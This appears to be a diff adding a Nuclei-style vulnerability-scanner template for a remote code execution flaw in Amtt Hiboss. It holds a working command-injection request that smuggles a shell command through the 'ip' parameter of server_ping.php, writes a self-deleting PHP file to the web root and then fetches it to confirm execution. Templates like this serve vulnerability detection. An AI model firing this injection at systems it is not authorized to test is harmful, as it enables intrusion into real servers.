@@ -1,0 +1,36 @@
+id: poc-yaml-amtt-hiboss-server-ping-rce
+info:
+  name: Amtt Hiboss Server Ping Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: rce
+  description: |
+    This template exploits a remote code execution vulnerability in the Amtt Hiboss server ping functionality.
+http:
+  - raw:
+      - |
+        GET /manager/radius/server_ping.php?ip=127.0.0.1|echo%20"<?php%20echo%20md5({{random_value}});unlink(__FILE__);?>">../../{{random_value}}.php&id=1 HTTP/1.1
+        Host: {{Hostname}}
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "parent.doTestResult"
+  - raw:
+      - |
+        GET /{{random_value}}.php HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - contains(body, md5(random_value))
+variables:
+  random_value: "{{rand_text_alphanumeric(10)}}"
